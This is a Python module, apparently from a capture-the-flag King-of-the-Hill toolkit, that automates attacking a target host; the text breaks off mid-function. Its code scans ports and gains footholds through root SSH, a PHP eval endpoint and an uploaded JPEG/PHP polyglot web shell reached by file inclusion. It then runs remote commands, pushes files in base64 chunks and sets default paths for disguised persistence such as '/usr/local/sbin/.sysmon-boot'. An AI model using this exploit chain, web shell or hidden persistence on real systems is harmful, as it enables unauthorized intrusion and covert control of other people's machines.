"""koth — thin, config-driven wrapper around the local KOTH-OPS kit.

The kit lives outside this repo. Its location is never hardcoded: it is
resolved from (in order) an explicit ``--kit-dir``, ``CTF_KOTH_KIT`` /
``KOTH_KIT_DIR``, ``KOTH_OPS_DIR`` / ``CTF_KOTH_OPS``, then
``~/Projects/KOTH-OPS`` with the usual kit subdirectories.

Every command takes ``--config FILE`` and refuses to run when that file is
missing. The kit scripts source the config themselves; this module only
passes the absolute path and the documented flags. No target IP or target
path is embedded here.

Script contract (see kit-capture/README.md and kit-guard/watch.sh):

  discover.sh --config FILE          ranked vectors + ``---JSON---`` block
  capture.sh  --config FILE [--dry-run]
  retake.sh   --config FILE          (kit-retake; not present yet)
  watch.sh    --config FILE          (kit-guard; long-running loop)
  verify.sh   --config FILE          exit 0 = pass, non-zero = fail
"""
from __future__ import annotations

import base64
import json
import os
import re
import shlex
import shutil
import socket
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

EXIT_OK = 0
EXIT_FAIL = 1
EXIT_ENV = 3       # kit/script or output unavailable
EXIT_USAGE = 4     # bad invocation (missing config, missing argument)

SCRIPT_NAMES = {
    "discover": "discover.sh",
    "capture": "capture.sh",
    "retake": "retake.sh",
    "watch": "watch.sh",
    "verify": "verify.sh",
    "restore": "restore.sh",
    "lock_vector": "lock_vector.sh",
    "guard_install": "guard_install.sh",
}

# Per-command wall-clock budget for the subprocess. watch.sh loops forever, so
# it gets a long default and can be shortened with --timeout.
DEFAULT_TIMEOUTS = {
    "discover": 120,
    "capture": 900,
    "retake": 900,
    "watch": 3600,
    "verify": 120,
}

KIT_ENV_VARS = ("CTF_KOTH_KIT", "KOTH_KIT_DIR")
OPS_ENV_VARS = ("KOTH_OPS_DIR", "CTF_KOTH_OPS")
KIT_SUBDIRS = ("kit", "kit-capture", "kit-guard", "kit-retake")

SCRIPT_TIMEOUT_RC = 124
SCRIPT_OSERROR_RC = 126


# ---------------------------------------------------------------------------
# Kit / script discovery
# ---------------------------------------------------------------------------
def ops_dir() -> Path:
    """KOTH-OPS root: env override, else ~/Projects/KOTH-OPS (no literal user path)."""
    for var in OPS_ENV_VARS:
        val = os.environ.get(var)
        if val:
            return Path(val).expanduser()
    return Path.home() / "Projects" / "KOTH-OPS"


def kit_candidates(override: str | Path | None = None) -> list[Path]:
    """Directories to search for kit scripts, most specific first."""
    if override:
        return [Path(override).expanduser()]
    roots: list[Path] = []
    for var in KIT_ENV_VARS:
        val = os.environ.get(var)
        if val:
            roots.append(Path(val).expanduser())
    if roots:
        return roots
    base = ops_dir()
    return [base] + [base / sub for sub in KIT_SUBDIRS]


def find_script(name: str, override: str | Path | None = None) -> Path | None:
    """Return the first readable script called *name*, or None."""
    for root in kit_candidates(override):
        for candidate in (root / name, *(root / sub / name for sub in KIT_SUBDIRS)):
            if candidate.is_file():
                return candidate
    return None


# ---------------------------------------------------------------------------
# Execution
# ---------------------------------------------------------------------------
def _normalize_rc(rc: int) -> int:
    # subprocess reports a signal death as a negative return code.
    return rc if rc >= 0 else 128 + abs(rc)


def run_script(script: Path, argv: list[str], timeout: int,
               env_extra: dict | None = None) -> dict:
    """Run a kit script through bash with a hard timeout.

    Returns a dict with rc/stdout/stderr/cmd/timeout/timed_out. Never raises
    for timeouts or exec failures; the caller propagates ``rc``.
    """
    cmd = ["bash", str(script), *argv]
    env = os.environ.copy()
    if env_extra:
        env.update({str(k): str(v) for k, v in env_extra.items()})
    result = {
        "cmd": cmd,
        "timeout": timeout,
        "rc": SCRIPT_OSERROR_RC,
        "stdout": "",
        "stderr": "",
        "timed_out": False,
    }
    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
            env=env,
        )
    except subprocess.TimeoutExpired as exc:
        result.update(
            rc=SCRIPT_TIMEOUT_RC,
            timed_out=True,
            stdout=_as_text(exc.stdout),
            stderr=_as_text(exc.stderr) or f"timed out after {timeout}s",
        )
        return result
    except OSError as exc:
        result["stderr"] = f"cannot execute {script}: {exc}"
        return result
    result.update(
        rc=_normalize_rc(proc.returncode),
        stdout=_as_text(proc.stdout),
        stderr=_as_text(proc.stderr),
    )
    return result


def _as_text(value) -> str:
    if value is None:
        return ""
    if isinstance(value, bytes):
        return value.decode(errors="replace")
    return str(value)


# ---------------------------------------------------------------------------
# Command construction
# ---------------------------------------------------------------------------
def script_supports(script: Path, flag: str) -> bool:
    """True when a script's text mentions *flag* (static read, never executed)."""
    try:
        return flag in script.read_text(errors="ignore")
    except OSError:
        return False


def script_argv(action: str, config: Path, args=None, script: Path | None = None) -> list[str]:
    """Flags for a kit script. Only documented flags are passed."""
    argv = ["--config", str(config)]
    if action == "capture" and getattr(args, "dry_run", False):
        argv.append("--dry-run")
    if action == "retake":
        # retake.sh --timeout is the wait per cycle, not a process budget.
        timeout = getattr(args, "timeout", None)
        if timeout is not None:
            argv += ["--timeout", str(timeout)]
    if action == "watch" and script is not None:
        # Two kit variants exist: one reads WATCH_INTERVAL, the newer one has
        # an --interval flag. Pass the flag only when the script advertises it.
        interval = getattr(args, "interval", None)
        if interval is not None and script_supports(script, "--interval"):
            argv += ["--interval", str(int(interval))]
    return argv


def subprocess_timeout(action: str, args=None) -> int:
    """Wall-clock budget for the wrapper's subprocess call."""
    if action == "retake":
        # Do not use --timeout here: retake.sh may run several cycles.
        return DEFAULT_TIMEOUTS[action]
    explicit = getattr(args, "timeout", None)
    return int(explicit) if explicit else DEFAULT_TIMEOUTS[action]


def script_env(action: str, args=None) -> dict:
    """Environment overrides the script understands.

    watch.sh has no --interval flag; it reads WATCH_INTERVAL. A value set
    directly in koth.conf still wins because the script sources the config
    after inheriting the environment.
    """
    if action == "watch":
        interval = getattr(args, "interval", None)
        if interval is not None:
            return {"WATCH_INTERVAL": str(interval)}
    return {}


# ---------------------------------------------------------------------------
# Output parsing
# ---------------------------------------------------------------------------
def parse_discover(stdout: str) -> list[dict]:
    """Parse discover.sh output: ranked ``a|b|c|d|e`` lines + ---JSON--- block."""
    vectors: list[dict] = []
    if "---JSON---" in stdout:
        tail = stdout.split("---JSON---", 1)[1].strip()
        try:
            obj = json.loads(tail)
        except (ValueError, TypeError):
            obj = None
        if isinstance(obj, dict) and isinstance(obj.get("vectors"), list):
            vectors = [v for v in obj["vectors"] if isinstance(v, dict)]
    if vectors:
        return vectors
    for line in stdout.splitlines():
        parts = line.strip().split("|")
        if len(parts) < 5 or not parts[0].isdigit():
            continue
        try:
            eta = int(parts[4])
        except ValueError:
            eta = parts[4]
        vectors.append({
            "rank": int(parts[0]),
            "vector": parts[1],
            "path": parts[2],
            "why": parts[3],
            "est_time_sec": eta,
        })
    return vectors


# ---------------------------------------------------------------------------
# Static config parsing (report only; nothing is executed)
# ---------------------------------------------------------------------------
_VAR_RE = re.compile(r"\$\{([A-Za-z_][A-Za-z0-9_]*)(?::[-=]([^}]*))?\}")
_DEFAULT_LINE_RE = re.compile(r'^:\s*"?\$\{([A-Za-z_][A-Za-z0-9_]*):[-=](.*)\}"?\s*$')
_ASSIGN_RE = re.compile(r"^(?:export\s+)?([A-Za-z_][A-Za-z0-9_]*)=(.*)$")
_ARRAY_OPEN_RE = re.compile(r"^(?:export\s+)?([A-Za-z_][A-Za-z0-9_]*)=\($")
_ARRAY_ONE_RE = re.compile(r"^(?:export\s+)?([A-Za-z_][A-Za-z0-9_]*)=\((.*)\)\s*$")


def _strip_comment(text: str) -> str:
    quote = ""
    escaped = False
    for i, ch in enumerate(text):
        if escaped:
            escaped = False
            continue
        if ch == "\\":
            escaped = True
            continue
        if quote:
            if ch == quote:
                quote = ""
        elif ch in "\"'":
            quote = ch
        elif ch == "#":
            return text[:i]
    return text


def _unquote(value: str) -> str:
    value = value.strip()
    if len(value) >= 2 and value[0] == value[-1] and value[0] in "\"'":
        try:
            parts = shlex.split(value)
        except ValueError:
            return value[1:-1]
        return " ".join(parts)
    return value


def _expand(value: str, known: dict) -> str:
    def repl(match: re.Match) -> str:
        name, default = match.group(1), match.group(2)
        if name in known and not isinstance(known[name], list):
            return str(known[name])
        if name in os.environ:
            return os.environ[name]
        return default if default is not None else ""

    for _ in range(5):
        new = _VAR_RE.sub(repl, value)
        if new == value:
            break
        value = new
    return value


def parse_config(path: str | Path) -> dict:
    """Best-effort static read of a bash-style koth.conf.

    This never sources or executes the file. It understands plain assignments,
    ``: "${VAR:=default}"`` defaults, quoted values, and arrays. Anything else
    (command substitution, ``source``) is left as literal text.
    """
    cfg: dict = {}
    try:
        lines = Path(path).read_text(errors="ignore").splitlines()
    except OSError:
        return cfg

    i = 0
    while i < len(lines):
        line = lines[i].strip()
        i += 1
        if not line or line.startswith("#"):
            continue

        m = _DEFAULT_LINE_RE.match(line)
        if m:
            name = m.group(1)
            if name not in cfg:
                cfg[name] = _expand(_unquote(m.group(2)), cfg)
            continue

        m = _ARRAY_OPEN_RE.match(line)
        if m:
            name = m.group(1)
            items: list[str] = []
            while i < len(lines):
                item_line = _strip_comment(lines[i].strip())
                i += 1
                if item_line == ")":
                    break
                if not item_line:
                    continue
                try:
                    items.extend(shlex.split(item_line))
                except ValueError:
                    items.append(item_line)
            cfg[name] = items
            continue

        m = _ARRAY_ONE_RE.match(line)
        if m:
            name, body = m.group(1), m.group(2)
            try:
                cfg[name] = shlex.split(body)
            except ValueError:
                cfg[name] = [body]
            continue

        m = _ASSIGN_RE.match(line)
        if m:
            name, value = m.group(1), _strip_comment(m.group(2)).strip()
            cfg[name] = _unquote(_expand(value, cfg))
            continue
        # source/. lines and other bash constructs are intentionally ignored
    return cfg


def _first(cfg: dict, *names: str, default: str = "(not set)") -> str:
    for name in names:
        value = cfg.get(name)
        if isinstance(value, list):
            if value:
                return ", ".join(str(v) for v in value)
        elif value not in (None, ""):
            return str(value)
    return default


def _md(value: str) -> str:
    return str(value).replace("|", "\\|").replace("\n", "<br>")


def build_report(config_path: str | Path) -> tuple[str, dict]:
    """Collect king/checker/key/sentries/ports into markdown + a fields dict."""
    config_path = Path(config_path)
    cfg = parse_config(config_path)
    fields = {
        "config": str(config_path),
        "generated_at": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
        "target": _first(cfg, "TARGET"),
        "king_file": _first(cfg, "KING_FILE", "KING_PATH"),
        "expect_king": _first(cfg, "EXPECT_KING"),
        "checker": _first(cfg, "CHECKER_URL"),
        "auth_keys": _first(cfg, "AUTH_KEYS"),
        "our_pubkey": _first(cfg, "OUR_PUBKEY"),
        "key_comment": _first(cfg, "KEY_COMMENT"),
        "sentry_names": _first(cfg, "SENTRY_NAMES"),
        "sentry_patterns": _first(cfg, "SENTRY_PATTERNS"),
        "guard_path": _first(cfg, "GUARD_PATH", "INSTALL_DIR"),
        "ports": _first(cfg, "PORTS"),
        "stage_dir": _first(cfg, "STAGE_DIR"),
        "foothold_adapter": _first(cfg, "FOOTHOLD_ADAPTER"),
    }

    def table(title: str, rows: list[tuple[str, str]]) -> list[str]:
        out = [f"## {title}", "", "| Field | Value |", "|---|---|"]
        out += [f"| {_md(k)} | {_md(v)} |" for k, v in rows]
        out.append("")
        return out

    lines = [
        "# KotH report",
        "",
        f"- Config: `{config_path}`",
        f"- Generated: {fields['generated_at']}",
        f"- Target: {_md(fields['target'])}",
        "",
    ]
    lines += table("King", [
        ("King file", fields["king_file"]),
        ("Expected content", fields["expect_king"]),
        ("Checker", fields["checker"]),
    ])
    lines += table("Key", [
        ("Authorized keys file", fields["auth_keys"]),
        ("Our public key", fields["our_pubkey"]),
        ("Key comment", fields["key_comment"]),
    ])
    lines += table("Sentries", [
        ("Sentry names", fields["sentry_names"]),
        ("Sentry patterns", fields["sentry_patterns"]),
        ("Guard path", fields["guard_path"]),
    ])
    lines += table("Ports", [
        ("Ports", fields["ports"]),
    ])
    lines += table("Other", [
        ("Stage dir", fields["stage_dir"]),
        ("Foothold adapter", fields["foothold_adapter"]),
    ])
    return "\n".join(lines).rstrip() + "\n", fields


# ---------------------------------------------------------------------------
# Autonomous mode: `ctf.py koth auto TARGET` (and `ctf.py koth TARGET`)
# ---------------------------------------------------------------------------
AUTO_PORTS = (22, 80, *range(8000, 8011), 9999)
AUTO_STEP_TIMEOUTS = {
    "discover": 120,
    "capture": 900,
    "restore": 120,
    "lock_vector": 120,
    "guard_install": 120,
    "verify": 180,
}
AUTO_CORE_SCRIPTS = ("discover", "capture", "verify")
AUTO_POST_SCRIPTS = ("restore", "lock_vector", "guard_install")

AUTO_EXIT_OK = 0
AUTO_EXIT_RECON = 2
AUTO_EXIT_FOOTHOLD = 3
AUTO_EXIT_CAPTURE = 4
AUTO_EXIT_VERIFY = 5
AUTO_EXIT_CONFIG = 6

DEFAULT_EXPECT_KING = "super.denchuk"
DEFAULT_GUARD_PATH = "/usr/local/sbin/.sysmon-boot"
DEFAULT_KING_FILE = "/root/king.txt"
DEFAULT_AUTH_KEYS = "/root/.ssh/authorized_keys"
DEFAULT_SENTRY_NAMES = (".sysmon", ".svcwatch")

# JPEG magic + PHP so the same bytes pass a naive image check and execute when
# included by the upload/LFI endpoint. The PHP half only echoes command output.
POLYGLOT_JPG = (
    b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
    b"<?php echo 'CMDOUT:'; system($_GET['c']); ?>\n"
)

_TARGET_RE = re.compile(r"^[A-Za-z0-9](?:[A-Za-z0-9._-]*[A-Za-z0-9])?$")
_KOTH_PREFIX_RE = re.compile(r"(?i)^koth\s*:\s*(.+)$")
_UID_RE = re.compile(r"uid=(\d+)\(([^)]+)\)")
_UPLOAD_RE = re.compile(r"(/?uploads/[A-Za-z0-9_.-]+\.(?:jpe?g|png|gif))", re.I)
_RC_RE = re.compile(r"__RC=(\d+)")
_VERIFY_LINE_RE = re.compile(r"^(.+?)\s{2,}(PASS|FAIL)\s+(.*)$")
_PRIVATE_KEY_RE = re.compile(
    r"-----BEGIN [A-Z0-9 ]*PRIVATE KEY-----.*?-----END [A-Z0-9 ]*PRIVATE KEY-----",
    re.S,
)


def normalize_target(raw) -> str:
    """Turn ``koth: 10.0.0.1`` / ``http://10.0.0.1:8000/x`` into a bare host.

    Raises ValueError for empty values and for anything containing shell
    metacharacters, so the result is safe to embed in generated config.
    """
    if raw is None:
        raise ValueError("empty target")
    value = str(raw).strip()
    if not value:
        raise ValueError("empty target")

    match = _KOTH_PREFIX_RE.match(value)
    if match:
        value = match.group(1).strip()

    if "://" in value:
        parsed = urllib.parse.urlsplit(value)
        host = parsed.hostname
        if not host:
            raise ValueError(f"no host in target: {raw!r}")
        value = host
    elif value.count(":") == 1 and not value.startswith("["):
        host, _, port = value.partition(":")
        if port.isdigit():
            value = host

    value = value.strip().strip("/")
    if value.startswith("[") and value.endswith("]"):
        value = value[1:-1]
    if not _TARGET_RE.match(value):
        raise ValueError(f"invalid target: {raw!r}")
    return value


def _under_tmp(path: Path) -> bool:
    try:
        resolved = str(path.expanduser().resolve())
    except OSError:
        resolved = str(path.expanduser())
    return (
        resolved == "/tmp"
        or resolved.startswith("/tmp/")
        or resolved == "/var/tmp"
        or resolved.startswith("/var/tmp/")
    )


def state_root() -> Path:
    """Local state root. Overridable for tests; never defaults under /tmp."""
    override = os.environ.get("CTF_KOTH_STATE_DIR")
    if override:
        return Path(override).expanduser()
    return Path.home() / ".local" / "state" / "defex-ctf" / "koth"


def state_dir_for(target: str, root: str | Path | None = None) -> Path:
    """Per-target state directory, refusing /tmp and /var/tmp."""
    base = Path(root).expanduser() if root else state_root()
    path = base / normalize_target(target)
    if _under_tmp(path):
        raise ValueError("refusing to use /tmp for koth state")
    return path


# ---------------------------------------------------------------------------
# Recon
# ---------------------------------------------------------------------------
def _tcp_probe(host: str, port: int, timeout: float) -> bool:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            return sock.connect_ex((host, port)) == 0
    except OSError:
        return False


def recon_ports(host: str, ports=None, timeout: float = 1.0,
                workers: int = 16) -> dict:
    """Parallel TCP connect scan. Returns {port: bool} in requested order."""
    wanted = list(ports or AUTO_PORTS)
    found: dict = {}
    with ThreadPoolExecutor(max_workers=max(1, workers)) as pool:
        futures = {pool.submit(_tcp_probe, host, port, timeout): port
                   for port in wanted}
        for future in as_completed(futures):
            port = futures[future]
            try:
                found[port] = bool(future.result())
            except Exception:  # noqa: BLE001 - a probe must never abort recon
                found[port] = False
    return {port: found.get(port, False) for port in wanted}


def _nmap_grepable_ports(text: str) -> list[int]:
    """Extract open ports from `nmap -oG -` output."""
    out: list[int] = []
    for line in text.splitlines():
        if "Ports:" not in line:
            continue
        for item in line.split("Ports:", 1)[1].strip().split(","):
            parts = item.strip().split("/")
            if len(parts) >= 2 and parts[1] == "open" and parts[0].isdigit():
                out.append(int(parts[0]))
    return out


def discover_open_ports(host: str, timeout: float = 1.0, workers: int = 16,
                        full_timeout: float = 300.0) -> tuple[dict, list[int]]:
    """Quick known-port scan, then a bounded full TCP discovery.

    The quick scan returns in ~1 s; the full scan is nmap (tuned, bounded) with
    a python connect-scan fallback. Never blocks longer than ``full_timeout``.
    """
    ports = recon_ports(host, AUTO_PORTS, timeout=timeout, workers=workers)
    found = {p for p, is_open in ports.items() if is_open}
    if shutil.which("nmap"):
        cmd = ["nmap", "-Pn", "-n", "-p-", "--min-rate", "1500", "-T3",
               "--max-retries", "1", "--host-timeout", "240s", "-oG", "-", host]
        try:
            res = subprocess.run(cmd, capture_output=True, text=True,
                                 timeout=full_timeout)
            found |= set(_nmap_grepable_ports(res.stdout))
        except Exception:  # noqa: BLE001 - discovery is best effort
            pass
    else:
        try:
            full = recon_ports(host, range(1, 65536), timeout=0.35, workers=512)
            found |= {p for p, is_open in full.items() if is_open}
        except Exception:  # noqa: BLE001
            pass
    for port in found:
        ports[port] = True
    return ports, sorted(found)


# ---------------------------------------------------------------------------
# HTTP helper
# ---------------------------------------------------------------------------
def http_request(method: str, url: str, data: bytes | None = None,
                 headers: dict | None = None, timeout: float = 5.0):
    """Return (status, body). Network errors become (0, message)."""
    request = urllib.request.Request(
        url, data=data, headers=headers or {}, method=method.upper())
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            body = response.read(262144).decode("utf-8", "replace")
            return int(response.status), body
    except urllib.error.HTTPError as exc:
        try:
            body = exc.read(262144).decode("utf-8", "replace")
        except Exception:  # noqa: BLE001
            body = ""
        return int(exc.code), body
    except (urllib.error.URLError, OSError, ValueError) as exc:
        return 0, f"error: {exc}"


# ---------------------------------------------------------------------------
# Keys (public material only; private key contents are never stored)
# ---------------------------------------------------------------------------
def resolve_key_path(explicit: str | None = None) -> Path | None:
    if explicit:
        path = Path(explicit).expanduser()
        return path if path.is_file() else None
    if os.environ.get("KOTH_KEY"):
        path = Path(os.environ["KOTH_KEY"]).expanduser()
        return path if path.is_file() else None
    candidates = [
        Path.home() / ".ssh" / "id_ed25519",
        ops_dir() / "keys" / "id_ed25519",
    ]
    for candidate in candidates:
        if candidate.is_file():
            return candidate
    return None


def pubkey_for(key_path: str | Path | None) -> tuple[Path | None, str]:
    """Return (public key path, public key text). Never reads a private key."""
    if key_path is None:
        default = Path.home() / ".ssh" / "id_ed25519.pub"
        if default.is_file():
            return default, default.read_text(errors="replace").strip()
        return None, ""
    path = Path(key_path).expanduser()
    candidates = []
    if path.name.endswith(".pub"):
        candidates.append(path)
    else:
        candidates.append(Path(str(path) + ".pub"))
    for candidate in candidates:
        if candidate.is_file():
            return candidate, candidate.read_text(errors="replace").strip()
    return None, ""


def key_comment(pubkey_text: str) -> str:
    parts = (pubkey_text or "").split()
    return parts[-1] if len(parts) >= 3 else ""


def _php_quote(value: str) -> str:
    return str(value).replace("\\", "\\\\").replace("'", "\\'")


# ---------------------------------------------------------------------------
# Footholds
# ---------------------------------------------------------------------------
def _ssh_base(key_path: str | Path, port: int = 22) -> list[str]:
    return [
        "ssh",
        "-i", str(key_path),
        "-o", "BatchMode=yes",
        "-o", "ConnectTimeout=5",
        "-o", "StrictHostKeyChecking=accept-new",
        "-o", "IdentitiesOnly=yes",
        "-p", str(port),
    ]


def parse_uid(text: str) -> dict | None:
    match = _UID_RE.search(text or "")
    if not match:
        return None
    return {"uid": int(match.group(1)), "user": match.group(2)}


def _foothold_result(kind: str, ok: bool, **extra) -> dict:
    result = {"kind": kind, "ok": ok}
    result.update(extra)
    return result


def try_ssh_foothold(host: str, key_path: Path | None,
                     timeout: float = 5.0) -> dict:
    if key_path is None:
        return _foothold_result("ssh", False, skipped=True,
                                detail="no ssh key found")
    argv = _ssh_base(key_path) + [f"root@{host}", "id"]
    try:
        proc = subprocess.run(argv, capture_output=True, text=True,
                              timeout=timeout)
    except subprocess.TimeoutExpired:
        return _foothold_result("ssh", False, detail=f"timeout after {timeout}s")
    except OSError as exc:
        return _foothold_result("ssh", False, detail=f"ssh failed: {exc}")
    parsed = parse_uid(proc.stdout)
    ok = proc.returncode == 0 and parsed is not None
    return _foothold_result(
        "ssh", ok, host=host, user=(parsed or {}).get("user", "root"),
        uid=(parsed or {}).get("uid", -1), key=str(key_path), port=22,
        detail=(proc.stdout or proc.stderr).strip()[:400],
    )


def try_http_eval_foothold(host: str, timeout: float = 5.0) -> dict:
    code = 'echo shell_exec("id");'
    attempts = []
    for path in ("/trycode", "/eval", "/cmd"):
        url = f"http://{host}:8002{path}"
        status, body = http_request(
            "POST", url,
            data=urllib.parse.urlencode({"code": code}).encode(),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=timeout,
        )
        parsed = parse_uid(body)
        attempts.append({"url": url, "status": status, "ok": bool(parsed)})
        if parsed:
            return _foothold_result(
                "http_eval", True, host=host, url=url,
                user=parsed["user"], uid=parsed["uid"], attempts=attempts,
                detail=(body or "").strip()[:400],
            )
    return _foothold_result("http_eval", False, host=host, attempts=attempts,
                            detail="no eval endpoint returned id")


def _multipart_body(field: str, filename: str, content: bytes,
                    boundary: str, extra: dict | None = None) -> bytes:
    parts = []
    for name, value in (extra or {}).items():
        parts.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{name}"\r\n\r\n'
            f"{value}\r\n"
        )
    parts.append(
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{field}"; '
        f'filename="{filename}"\r\n'
        "Content-Type: image/jpeg\r\n\r\n"
    )
    head = "".join(parts).encode()
    tail = f"\r\n--{boundary}--\r\n".encode()
    return head + content + tail


def try_upload_lfi_foothold(host: str, timeout: float = 5.0) -> dict:
    boundary = f"----defexkoth{int(time.time() * 1000)}"
    body = _multipart_body(
        "file", "koth.jpg", POLYGLOT_JPG, boundary,
        extra={"name": "x", "email": "x@x", "question": "x"})
    upload_url = f"http://{host}:8001/support.php"
    status, response = http_request(
        "POST", upload_url, data=body,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
        timeout=timeout,
    )
    match = _UPLOAD_RE.search(response or "")
    if not match:
        return _foothold_result(
            "upload_lfi", False, host=host, url=upload_url, status=status,
            detail=(response or "").strip()[:400])
    page = match.group(1).lstrip("/")
    base = f"http://{host}:8001"
    lfi_url = f"{base}/?page={page}&c=id"
    status, output = http_request("GET", lfi_url, timeout=timeout)
    parsed = parse_uid(output)
    return _foothold_result(
        "upload_lfi", bool(parsed), host=host, base=base, page=page,
        url=lfi_url, user=(parsed or {}).get("user", ""),
        uid=(parsed or {}).get("uid", -1),
        detail=(output or "").strip()[:400],
    )


def detect_foothold(host: str, key_path: Path | None = None,
                    open_ports=None, timeout: float = 5.0) -> dict:
    """First successful foothold wins: SSH, then eval, then upload/LFI."""
    open_set = set(open_ports) if open_ports is not None else None
    attempts = []

    if key_path is not None and (open_set is None or 22 in open_set):
        result = try_ssh_foothold(host, key_path, timeout)
        attempts.append(result)
        if result.get("ok"):
            result["attempts"] = attempts
            return result

    if open_set is None or 8002 in open_set:
        result = try_http_eval_foothold(host, timeout)
        attempts.append(result)
        if result.get("ok"):
            result["attempts"] = attempts
            return result

    if open_set is None or 8001 in open_set:
        result = try_upload_lfi_foothold(host, timeout)
        attempts.append(result)
        if result.get("ok"):
            result["attempts"] = attempts
            return result

    return {"ok": False, "kind": None, "host": host, "attempts": attempts}


# ---------------------------------------------------------------------------
# Remote command execution through a detected foothold
# ---------------------------------------------------------------------------
def _parse_remote_result(status: int, body: str, timeout: float) -> dict:
    match = _RC_RE.search(body or "")
    if match:
        rc = int(match.group(1))
    else:
        rc = 0 if status and 0 < status < 400 else 1
    return {"rc": rc, "stdout": body or "", "stderr": "",
            "status": status, "timeout": timeout}


def run_remote(foothold: dict, command: str, timeout: float = 5.0) -> dict:
    """Run one shell command on the target via the detected foothold."""
    kind = foothold.get("kind")
    wrapped = command + '; printf "\\n__RC=%s\\n" "$?"'

    if kind == "ssh":
        argv = _ssh_base(foothold.get("key", ""), foothold.get("port", 22))
        argv += [f"{foothold.get('user', 'root')}@{foothold.get('host')}",
                 "--", wrapped]
        try:
            proc = subprocess.run(argv, capture_output=True, text=True,
                                  timeout=timeout)
        except subprocess.TimeoutExpired:
            return {"rc": 124, "stdout": "", "stderr": f"timeout after {timeout}s",
                    "timeout": timeout, "cmd": argv}
        except OSError as exc:
            return {"rc": 126, "stdout": "", "stderr": f"ssh failed: {exc}",
                    "timeout": timeout, "cmd": argv}
        parsed = _parse_remote_result(
            200 if proc.returncode == 0 else proc.returncode,
            proc.stdout, timeout)
        if parsed["rc"] == 0 and proc.returncode != 0:
            parsed["rc"] = proc.returncode
        parsed["stderr"] = proc.stderr or ""
        parsed["cmd"] = argv
        return parsed

    if kind == "http_eval":
        code = f"echo shell_exec('{_php_quote(wrapped)}');"
        status, body = http_request(
            "POST", foothold.get("url", ""),
            data=urllib.parse.urlencode({"code": code}).encode(),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=timeout,
        )
        return _parse_remote_result(status, body, timeout)

    if kind == "upload_lfi":
        url = (f"{foothold.get('base')}/?page={foothold.get('page')}"
               f"&c={urllib.parse.quote(wrapped, safe='')}")
        status, body = http_request("GET", url, timeout=timeout)
        return _parse_remote_result(status, body, timeout)

    return {"rc": 1, "stdout": "", "stderr": f"unsupported foothold: {kind}",
            "timeout": timeout}


def upload_remote(foothold: dict, content: bytes | str, remote_path: str,
                  timeout: float = 5.0, chunk: int = 600) -> dict:
    """Write *content* to *remote_path* using the foothold transport."""
    if isinstance(content, str):
        content = content.encode()
    b64 = base64.b64encode(content).decode()
    quoted = shlex.quote(remote_path)
    kind = foothold.get("kind")

    if kind == "ssh":
        return run_remote(foothold, f"printf %s {b64} | base64 -d > {quoted}",
                          timeout)

    if kind == "http_eval":
        code = (
            f"file_put_contents('{_php_quote(remote_path)}', "
            f"base64_decode('{b64}')); echo 'OK';"
        )
        status, body = http_request(
            "POST", foothold.get("url", ""),
            data=urllib.parse.urlencode({"code": code}).encode(),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=timeout,
        )
        return {"rc": 0 if "OK" in (body or "") else 1, "stdout": body or "",
                "stderr": "", "status": status, "timeout": timeout}

    if kind == "upload_lfi":
        first = True
        for start in range(0, len(b64), chunk):
            part = b64[start:start + chunk]
            operator = ">" if first else ">>"
            result = run_remote(
                foothold, f"printf %s {part} {operator} {quoted}", timeout)
            if result.get("rc") != 0:
                return result
            first = False
        return {"rc": 0, "stdout": "OK", "stderr": "", "timeout": timeout}

    return {"rc": 1, "stdout": "", "stderr": f"unsupported foothold: {kind}",
            "timeout": timeout}


def ensure_remote_script(foothold: dict, local_path: Path, remote_path: str,
                         timeout: float = 5.0) -> dict:
    probe = run_remote(
        foothold, f"test -f {shlex.quote(remote_path)} && echo EXISTS", timeout)
    if "EXISTS" in (probe.get("stdout") or ""):
        return {"rc": 0, "stdout": "already staged", "stderr": "",
                "timeout": timeout, "skipped": True}
    return upload_remote(foothold, Path(local_path).read_bytes(), remote_path,
                         timeout)


def probe_stage_dir(foothold: dict, user: str, timeout: float = 5.0) -> str:
    """Pick a writable staging dir: the user's backups dir, then any
    /home/*/backups/files, then /dev/shm, then /tmp."""
    if user:
        candidate = f"/home/{user}/backups/files"
        result = run_remote(
            foothold, f"test -w {shlex.quote(candidate)} && echo OK", timeout)
        if "OK" in (result.get("stdout") or ""):
            return candidate

    glob_command = (
        'for d in /home/*/backups/files; do '
        '[ -w "$d" ] && { echo "$d"; break; }; done')
    result = run_remote(foothold, glob_command, timeout)
    for line in (result.get("stdout") or "").splitlines():
        line = line.strip()
        if line.startswith("/home/") and line.endswith("/backups/files"):
            return line

    for candidate in ("/dev/shm/.koth-stage", "/tmp"):
        command = (f"mkdir -p {shlex.quote(candidate)} 2>/dev/null; "
                   f"test -w {shlex.quote(candidate)} && echo OK")
        result = run_remote(foothold, command, timeout)
        if "OK" in (result.get("stdout") or ""):
            return candidate
    return "/tmp"


# ---------------------------------------------------------------------------
# Config generation
# ---------------------------------------------------------------------------
def _dq(value) -> str:
    """Escape a value for a bash double-quoted ``${VAR:-default}`` slot."""
    return (str(value)
            .replace("\\", "\\\\")
            .replace('"', '\\"')
            .replace("$", "\\$")
            .replace("`", "\\`")
            .replace("\n", " ")
            .replace("\r", " "))


def _foothold_cmd(foothold: dict, state: Path) -> str:
    kind = foothold.get("kind")
    if kind == "ssh":
        return (
            f"ssh -i {shlex.quote(str(foothold.get('key', '')))} "
            "-o BatchMode=yes -o ConnectTimeout=5 "
            "-o StrictHostKeyChecking=accept-new -o IdentitiesOnly=yes "
            f"-p {int(foothold.get('port', 22))} "
            f"{foothold.get('user', 'root')}@{foothold.get('host')} -- {{CMD}}"
        )

    helper = state / "foothold_cmd.sh"
    if kind == "http_eval":
        script = (
            "#!/bin/bash\n"
            "set -uo pipefail\n"
